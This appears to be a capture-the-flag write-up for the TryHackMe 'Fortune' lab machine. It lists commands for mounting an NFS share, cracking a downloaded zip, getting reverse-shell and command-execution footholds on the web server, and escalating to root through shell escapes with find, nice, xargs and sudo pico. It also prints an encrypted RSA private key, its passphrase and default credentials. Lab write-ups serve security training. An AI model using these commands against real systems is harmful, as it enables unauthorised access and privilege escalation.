# Fortune THM Public Writeup
#### Important Machine related information

#### Map
```lua
nmap service overview


-- 3333 is the netcat zip download, avoidable step
```


hermes - **Note this key and its passphrase is random every time**:
- using showmount -e reveals a share. mounting this with: `mount -t nfs fortune.thm:/srv/nfs /tmp/nfs -o nolock` can find a `hermes_ssh` file
- this can be decoded using vignere with key n, then broken with ssh2john, john and rockyou, and will provide ssh access as hermes

#### Default Credentials
```
fortuna : MGE0OTJiM2  &&  ZGI4NjI0Mz   # test! 

# Aquinas: not sure if this random
# Hermes r_sa key:
// passwd: cuteko

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,57145A8D54A46E26334807885A43DA74

MBpsTtnjX14/G2VnexI+K4WFalKGoTm1/OHobQl+3EPZVY4LU4khWu2JABjv/EXv
cct34TxEu2kw7tYZmdlkosQANLdcLkryRZO8wnQmTmh/nAA9JOOsDNXDYUUteurf
j1UD3XouSNdygA7lDyGJPVqHPbkCOueG27Vryp5660kPpXmyEU7kOMMUpNzncR8r
yd6cQQDSd/ydzAhGpwdXkA4oxdX1qDCWz6Qc7hlMQbAUokGIsqwuRE1smloSwLln
dzTS6eXSq15XSM1Qcs4MVhyY9KX7nWN+8CfUrPRi1+msUlfGyhMacV6kHkl7aAQk
J58RsVKxcpkc8JkOHle//On1ZJ6noTOcSB1czMbhemH3n21FgreSOs8vxUqlX9x7
gVnjEbk7LbFBCObUhVUii3GURlpP1ro4Hv34VvOJl1MKtCOuI0kMyqYjTtFnnVLZ
zBKNoKOlzjM2FTZ2a2ziNAI1OEcO6KZRSPnSGZ0v0ra7GdP9Gj9HHGiIcZbwhex2
+6HGR87WtUWzEG0OCkiR38GhBrJ+byDGYbbAClJu/iun/unTApH7KzZTguOP8ICk
6Pinw3BsKcZbxhAQtjPNhzO/J7c+eMjUtf4yXqz3V0TtjujsluAv05IuTZbjHnCA
un7avtJFRXUVCkPfrEMIN00wOezrNSy2WMF5YzzAuZes4bHbPx2l6neDp6VmfVkg
cK6hZswiEks5MyMLftcLb80fg6hXwy4ZO51Cb4CKEwGU15C1cXG7vglqKlgLscVk
DAg8ySZwwAdffefxhNtiMkxDKu3BWU2onMyjLH7F57DM/gyZm4jGb7RXbvijva/o
PXZCIc0+nWbEAYYV/gG7u09cPWLQmyIaWKaLDxKMXyUW/8nfhIGo2LnACaMIAmZY
bqa9BV1Pkc6zc0hyDqRKa+b71WH5PWXvXETRs2BJcrKyAowiyd1N+EjYi+vzCD6D
gPZXi2wDvEQldNK58NY7IH2Jq1K6+K/6PeRdY2SEp6lQIijBogwFR4AxyNEt/jTe
LEA9ZpJid2sBO+O+SuPDMHfyl/TPQXB0kAAm0GuSmtxqOSrOYX3xPxJ7/+5ioDJZ
TqzNv+uD311ZPuWrKOApc27ZNu7x0Hbd6ATUaqTCkT1eCu4dFPvAROf2DQ8X0Fnx
kui1kvxEc2zU8QqLCizYxZnOLfhF6rtRLfM+zyTA96imlYTtDJMkwgAQU/gxPKuC
PEA6T08FD6TMhJYnjODKmYpYyj21CyKioqmIBR+b4okwYkAQ8WaLZVzCq4C8hoRm
RPCX49MyO6xTdF0mi+2Lsnq+sGJFaeThK5X4J+DGeKmN80cJ7lg0csKmaOTrWX3E
nv/T8D/SDbwybcSj7lISsZAagxaL/dpIIGkP87ZXsRAN57lGZ8gH1n4zMYACH1rt
fNRrsHGlYsqQGvhCtgM9iUZwJALAkqy71XXXy9e+a31QkmG8kRhBiQTex+GZRv6O
gX0bg5csBqJMyJtMNm35GRhoxOmQb0yzKJW/B9uLA3yc/qEOJuu+BjcNx9YrqhoE
h2ZlzchBizy6lU08RI/Py0OGB6YfTWTXM89AENH3sttMI765+CZaypRUBDWDQSrF
-----END RSA PRIVATE KEY-----
```

#### Network Services to Foothold
```
nc fortune.thm 3333 | base64 -d > test.zip
unzip test.zip
zip2john test.zip > hash.txt
john hash.txt
unzip test.zip
cat creds.txt

curl fortune.thm:3333 | base64 -d > f.zip
/opt/john/zip2john f.zip > fj
john --wordlist=rockyou.txt fj
echo PASS | unzip f.zip
cat creds.txt


wget -qO - "$IP:3333" | base64 -d > file.zip
PASSWORD=$(fcrackzip -v -u -D -p "$Wordlist" file.zip | grep -o '== [a-zA-Z0-9]*$' | awk '{print $2}')
unzip -P "$PASSWORD" file.zip 
```

`cat file.txt | base64 -d > test.zip; unzip -P (fcrackzip -v -u -D -p $location/rockyou.txt test.zip | grep "pw" |awk '{print $5}') test.zip; cat creds.`


www-data 1:
- the website on 80 has an ip and port field. this will on a random change connect back as a reverse shell, if tried multiple times
- as the form fields are randomised, it must be done manually, but is not difficult.
- connects back as www-data

www-data 2:
- under port 80 `/_styles` is another website with straight command execution as www-data with the `luck` querystring param
- it has a 1 in 4 chance of running, but will also block any use of the text `nc`
#### Privilege Escalation

```bash
find . -exec /bin/sh -p \; -quit

ionice /bin/sh -p

/usr/bin/nice /bin/sh -p

xargs -a /dev/null sh -p

# Is random so needs lots of tries
python -c 'import pty; pty.spawn("/home/lucky_shell")' 

# Machinh //execute with command:
# as fortuna sudo pico 
sudo pico
^R^X
reset; sh 1>&0 2>&0
# Alternative instruction include - holmes
sudo pico /etc/sudoers


# kairos and python repl: to get to kairos use suid on find: `find . -exec /bin/sh -p \; -quit
python
import pty;
pty.spawn("/bin/bash");
```

#### Flags
```bash
/media/darts
/srv/blackjack
/lib/checkers
/usr/games/flag
/usr/local/games/flag
/geama/flag
/home/fortuna/Desktop/chess (thanks to mug3njutsu on discord for this)
```

#### References

https://qvipin.medium.com/fortune-koth-writeup-5f4684af4d45
https://github.com/Prim1Tive/CTFwriteups/blob/master/TryHackMe/KOTH/Fortune.md
https://medium.com/@Ankit.0101/koth-fortuna-walkthrough-tryhackme-by-ankit-kumar-astersec-808cc61749e2
https://github.com/holmes-py/King-of-the-hill?tab=readme-ov-file#machine-name-fortune
https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/koth-fortune.md